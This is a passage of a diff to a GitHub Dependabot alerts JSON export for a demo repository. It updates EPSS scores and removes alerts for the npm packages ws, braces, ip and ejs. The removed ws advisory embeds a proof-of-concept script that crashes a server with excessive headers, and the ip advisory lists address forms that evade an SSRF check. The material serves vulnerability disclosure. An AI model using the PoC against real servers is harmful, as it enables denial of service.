           "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -2693,8 +3198,8 @@
           }
         },
         "epss": {
-          "percentage": 0.00118,
-          "percentile": 0.31888
+          "percentage": 0.00131,
+          "percentile": 0.34004
         },
         "cvss": {
           "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -2819,8 +3324,8 @@
           }
         },
         "epss": {
-          "percentage": 0.00266,
-          "percentile": 0.50075
+          "percentage": 0.00366,
+          "percentile": 0.57823
         },
         "cvss": {
           "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
@@ -3033,7 +3538,7 @@
         },
         "epss": {
           "percentage": 0.00156,
-          "percentile": 0.37521
+          "percentile": 0.37404
         },
         "cvss": {
           "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
@@ -3315,7 +3820,7 @@
         },
         "epss": {
           "percentage": 0.00066,
-          "percentile": 0.21005
+          "percentile": 0.21011
         },
         "cvss": {
           "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:L",
@@ -3542,8 +4047,8 @@
           }
         },
         "epss": {
-          "percentage": 0.00296,
-          "percentile": 0.52646
+          "percentage": 0.00611,
+          "percentile": 0.68716
         },
         "cvss": {
           "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -3577,496 +4082,6 @@
       "dismissed_comment": null,
       "fixed_at": null,
       "auto_dismissed_at": "2025-06-02T13:38:20Z"
-    },
-    {
-      "number": 142,
-      "state": "open",
-      "dependency": {
-        "package": {
-          "ecosystem": "npm",
-          "name": "ws"
-        },
-        "manifest_path": "frontend/package-lock.json",
-        "scope": "development",
-        "relationship": "transitive"
-      },
-      "security_advisory": {
-        "ghsa_id": "GHSA-3h5v-q93c-6h6q",
-        "cve_id": "CVE-2024-37890",
-        "summary": "ws affected by a DoS when handling a request with many HTTP headers",
-        "description": "### Impact\n\nA request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.\n\n### Proof of concept\n\n```js\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 0 }, function () {\n  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');\n  const headers = {};\n  let count = 0;\n\n  for (let i = 0; i < chars.length; i++) {\n    if (count === 2000) break;\n\n    for (let j = 0; j < chars.length; j++) {\n      const key = chars[i] + chars[j];\n      headers[key] = 'x';\n\n      if (++count === 2000) break;\n    }\n  }\n\n  headers.Connection = 'Upgrade';\n  headers.Upgrade = 'websocket';\n  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';\n  headers['Sec-WebSocket-Version'] = '13';\n\n  const request = http.request({\n    headers: headers,\n    host: '127.0.0.1',\n    port: wss.address().port\n  });\n\n  request.end();\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)\n\n### Workarounds\n\nIn vulnerable versions of ws, the issue can be mitigated in the following ways:\n\n1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.\n2. Set `server.maxHeadersCount` to `0` so that no limit is applied.\n\n### Credits\n\nThe vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.\n\n### References\n\n- https://github.com/websockets/ws/issues/2230\n- https://github.com/websockets/ws/pull/2231\n\n[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize\n[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener\n[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount\n",
-        "severity": "high",
-        "identifiers": [
-          {
-            "value": "GHSA-3h5v-q93c-6h6q",
-            "type": "GHSA"
-          },
-          {
-            "value": "CVE-2024-37890",
-            "type": "CVE"
-          }
-        ],
-        "references": [
-          {
-            "url": "https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q"
-          },
-          {
-            "url": "https://github.com/websockets/ws/issues/2230"
-          },
-          {
-            "url": "https://github.com/websockets/ws/pull/2231"
-          },
-          {
-            "url": "https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f"
-          },
-          {
-            "url": "https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e"
-          },
-          {
-            "url": "https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c"
-          },
-          {
-            "url": "https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63"
-          },
-          {
-            "url": "https://github.com/advisories/GHSA-3h5v-q93c-6h6q"
-          }
-        ],
-        "published_at": "2024-06-17T19:09:10Z",
-        "updated_at": "2024-08-05T05:02:34Z",
-        "withdrawn_at": null,
-        "vulnerabilities": [
-          {
-            "package": {
-              "ecosystem": "npm",
-              "name": "ws"
-            },
-            "severity": "high",
-            "vulnerable_version_range": ">= 2.1.0, < 5.2.4",
-            "first_patched_version": {
-              "identifier": "5.2.4"
-            }
-          },
-          {
-            "package": {
-              "ecosystem": "npm",
-              "name": "ws"
-            },
-            "severity": "high",
-            "vulnerable_version_range": ">= 6.0.0, < 6.2.3",
-            "first_patched_version": {
-              "identifier": "6.2.3"
-            }
-          },
-          {
-            "package": {
-              "ecosystem": "npm",
-              "name": "ws"
-            },
-            "severity": "high",
-            "vulnerable_version_range": ">= 7.0.0, < 7.5.10",
-            "first_patched_version": {
-              "identifier": "7.5.10"
-            }
-          },
-          {
-            "package": {
-              "ecosystem": "npm",
-              "name": "ws"
-            },
-            "severity": "high",
-            "vulnerable_version_range": ">= 8.0.0, < 8.17.1",
-            "first_patched_version": {
-              "identifier": "8.17.1"
-            }
-          }
-        ],
-        "cvss_severities": {
-          "cvss_v3": {
-            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
-            "score": 7.5
-          },
-          "cvss_v4": {
-            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
-            "score": 8.7
-          }
-        },
-        "epss": {
-          "percentage": 0.0032,
-          "percentile": 0.54562
-        },
-        "cvss": {
-          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
-          "score": 7.5
-        },
-        "cwes": [
-          {
-            "cwe_id": "CWE-476",
-            "name": "NULL Pointer Dereference"
-          }
-        ]
-      },
-      "security_vulnerability": {
-        "package": {
-          "ecosystem": "npm",
-          "name": "ws"
-        },
-        "severity": "high",
-        "vulnerable_version_range": ">= 6.0.0, < 6.2.3",
-        "first_patched_version": {
-          "identifier": "6.2.3"
-        }
-      },
-      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/142",
-      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/142",
-      "created_at": "2025-06-02T13:38:19Z",
-      "updated_at": "2025-06-02T13:38:19Z",
-      "dismissed_at": null,
-      "dismissed_by": null,
-      "dismissed_reason": null,
-      "dismissed_comment": null,
-      "fixed_at": null,
-      "auto_dismissed_at": null
-    },
-    {
-      "number": 141,
-      "state": "open",
-      "dependency": {
-        "package": {
-          "ecosystem": "npm",
-          "name": "braces"
-        },
-        "manifest_path": "frontend/package-lock.json",
-        "scope": "development",
-        "relationship": "transitive"
-      },
-      "security_advisory": {
-        "ghsa_id": "GHSA-grv7-fg5c-xmjg",
-        "cve_id": "CVE-2024-4068",
-        "summary": "Uncontrolled resource consumption in braces",
-        "description": "The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends \"imbalanced braces\" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.\n",
-        "severity": "high",
-        "identifiers": [
-          {
-            "value": "GHSA-grv7-fg5c-xmjg",
-            "type": "GHSA"
-          },
-          {
-            "value": "CVE-2024-4068",
-            "type": "CVE"
-          }
-        ],
-        "references": [
-          {
-            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4068"
-          },
-          {
-            "url": "https://github.com/micromatch/braces/issues/35"
-          },
-          {
-            "url": "https://devhub.checkmarx.com/cve-details/CVE-2024-4068"
-          },
-          {
-            "url": "https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308"
-          },
-          {
-            "url": "https://github.com/micromatch/braces/pull/37"
-          },
-          {
-            "url": "https://github.com/micromatch/braces/pull/40"
-          },
-          {
-            "url": "https://github.com/micromatch/braces/commit/415d660c3002d1ab7e63dbf490c9851da80596ff"
-          },
-          {
-            "url": "https://github.com/advisories/GHSA-grv7-fg5c-xmjg"
-          }
-        ],
-        "published_at": "2024-05-14T18:30:54Z",
-        "updated_at": "2024-07-05T21:25:08Z",
-        "withdrawn_at": null,
-        "vulnerabilities": [
-          {
-            "package": {
-              "ecosystem": "npm",
-              "name": "braces"
-            },
-            "severity": "high",
-            "vulnerable_version_range": "< 3.0.3",
-            "first_patched_version": {
-              "identifier": "3.0.3"
-            }
-          }
-        ],
-        "cvss_severities": {
-          "cvss_v3": {
-            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
-            "score": 7.5
-          },
-          "cvss_v4": {
-            "vector_string": null,
-            "score": 0.0
-          }
-        },
-        "epss": {
-          "percentage": 0.00166,
-          "percentile": 0.38778
-        },
-        "cvss": {
-          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
-          "score": 7.5
-        },
-        "cwes": [
-          {
-            "cwe_id": "CWE-400",
-            "name": "Uncontrolled Resource Consumption"
-          },
-          {
-            "cwe_id": "CWE-1050",
-            "name": "Excessive Platform Resource Consumption within a Loop"
-          }
-        ]
-      },
-      "security_vulnerability": {
-        "package": {
-          "ecosystem": "npm",
-          "name": "braces"
-        },
-        "severity": "high",
-        "vulnerable_version_range": "< 3.0.3",
-        "first_patched_version": {
-          "identifier": "3.0.3"
-        }
-      },
-      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/141",
-      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/141",
-      "created_at": "2025-06-02T13:38:19Z",
-      "updated_at": "2025-06-02T13:38:19Z",
-      "dismissed_at": null,
-      "dismissed_by": null,
-      "dismissed_reason": null,
-      "dismissed_comment": null,
-      "fixed_at": null,
-      "auto_dismissed_at": null
-    },
-    {
-      "number": 140,
-      "state": "open",
-      "dependency": {
-        "package": {
-          "ecosystem": "npm",
-          "name": "ip"
-        },
-        "manifest_path": "frontend/package-lock.json",
-        "scope": "development",
-        "relationship": "transitive"
-      },
-      "security_advisory": {
-        "ghsa_id": "GHSA-2p57-rm9w-gvfp",
-        "cve_id": "CVE-2024-29415",
-        "summary": "ip SSRF improper categorization in isPublic",
-        "description": "The ip package through 2.0.1 for Node.js might allow SSRF because some IP addresses (such as 127.1, 01200034567, 012.1.2.3, 000:0:0000::01, and ::fFFf:127.0.0.1) are improperly categorized as globally routable via isPublic. NOTE: this issue exists because of an incomplete fix for CVE-2023-42282.",
-        "severity": "high",
-        "identifiers": [
-          {
-            "value": "GHSA-2p57-rm9w-gvfp",
-            "type": "GHSA"
-          },
-          {
-            "value": "CVE-2024-29415",
-            "type": "CVE"
-          }
-        ],
-        "references": [
-          {
-            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-29415"
-          },
-          {
-            "url": "https://github.com/indutny/node-ip/issues/150"
-          },
-          {
-            "url": "https://github.com/indutny/node-ip/pull/143"
-          },
-          {
-            "url": "https://github.com/indutny/node-ip/pull/144"
-          },
-          {
-            "url": "https://security.netapp.com/advisory/ntap-20250117-0010"
-          },
-          {
-            "url": "https://github.com/advisories/GHSA-2p57-rm9w-gvfp"
-          }
-        ],
-        "published_at": "2024-06-02T22:29:29Z",
-        "updated_at": "2025-01-17T21:31:39Z",
-        "withdrawn_at": null,
-        "vulnerabilities": [
-          {
-            "package": {
-              "ecosystem": "npm",
-              "name": "ip"
-            },
-            "severity": "high",
-            "vulnerable_version_range": "<= 2.0.1",
-            "first_patched_version": null
-          }
-        ],
-        "cvss_severities": {
-          "cvss_v3": {
-            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
-            "score": 8.1
-          },
-          "cvss_v4": {
-            "vector_string": null,
-            "score": 0.0
-          }
-        },
-        "epss": {
-          "percentage": 0.00438,
-          "percentile": 0.61788
-        },
-        "cvss": {
-          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
-          "score": 8.1
-        },
-        "cwes": [
-          {
-            "cwe_id": "CWE-918",
-            "name": "Server-Side Request Forgery (SSRF)"
-          }
-        ]
-      },
-      "security_vulnerability": {
-        "package": {
-          "ecosystem": "npm",
-          "name": "ip"
-        },
-        "severity": "high",
-        "vulnerable_version_range": "<= 2.0.1",
-        "first_patched_version": null
-      },
-      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/140",
-      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/140",
-      "created_at": "2025-06-02T13:38:19Z",
-      "updated_at": "2025-06-02T13:38:19Z",
-      "dismissed_at": null,
-      "dismissed_by": null,
-      "dismissed_reason": null,
-      "dismissed_comment": null,
-      "fixed_at": null,
-      "auto_dismissed_at": null
-    },
-    {
-      "number": 139,
-      "state": "open",
-      "dependency": {
-        "package": {
-          "ecosystem": "npm",
-          "name": "ejs"
-        },
-        "manifest_path": "frontend/package-lock.json",
-        "scope": "development",
-        "relationship": "transitive"
-      },
-      "security_advisory": {
-        "ghsa_id": "GHSA-ghr5-ch3p-vcr6",
-        "cve_id": "CVE-2024-33883",
-        "summary": "ejs lacks certain pollution protection",
-        "description": "The ejs (aka Embedded JavaScript templates) package before 3.1.10 for Node.js lacks certain pollution protection.",
-        "severity": "medium",
-        "identifiers": [
-          {
-            "value": "GHSA-ghr5-ch3p-vcr6",
-            "type": "GHSA"
-          },
-          {
-            "value": "CVE-2024-33883",
-            "type": "CVE"
-          }
-        ],
-        "references": [
-          {
-            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-33883"
-          },
-          {
-            "url": "https://github.com/mde/ejs/commit/e469741dca7df2eb400199e1cdb74621e3f89aa5"
-          },
-          {
-            "url": "https://github.com/mde/ejs/compare/v3.1.9...v3.1.10"
-          },
-          {
-            "url": "https://security.netapp.com/advisory/ntap-20240605-0003"
-          },
-          {
-            "url": "https://github.com/advisories/GHSA-ghr5-ch3p-vcr6"
-          }
-        ],
-        "published_at": "2024-04-28T18:30:31Z",
-        "updated_at": "2024-08-02T15:45:54Z",
-        "withdrawn_at": null,
-        "vulnerabilities": [
-          {
-            "package": {
-              "ecosystem": "npm",
-              "name": "ejs"
-            },
-            "severity": "medium",
-            "vulnerable_version_range": "< 3.1.10",
-            "first_patched_version": {
-              "identifier": "3.1.10"
-            }
-          }
-        ],
-        "cvss_severities": {
-          "cvss_v3": {
-            "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
-            "score": 4.0
-          },
-          "cvss_v4": {
-            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
-            "score": 6.9
-          }
-        },
-        "epss": {
-          "percentage": 0.00554,
-          "percentile": 0.66715
-        },
-        "cvss": {
-          "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
-          "score": 4.0
-        },
-        "cwes": [
-          {
-            "cwe_id": "CWE-693",
-            "name": "Protection Mechanism Failure"
-          },
-          {
-            "cwe_id": "CWE-1321",
-            "name": "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
-          }
-        ]
-      },
-      "security_vulnerability": {
-        "package": {
-          "ecosystem": "npm",
-          "name": "ejs"
-        },
-        "severity": "medium",
-        "vulnerable_version_range": "< 3.1.10",
-        "first_patched_version": {
-          "identifier": "3.1.10"
-        }
-      },
-      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/139",
-      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/139",
-      "created_at": "2025-06-02T13:38:19Z",
-      "updated_at": "2025-06-02T13:38:19Z",
-      "dismissed_at": null,
-      "dismissed_by": null,
-      "dismissed_reason": null,
-      "dismissed_comment": null,
-      "fixed_at": null,
-      "auto_dismissed_at": null
     }
   ]
 }
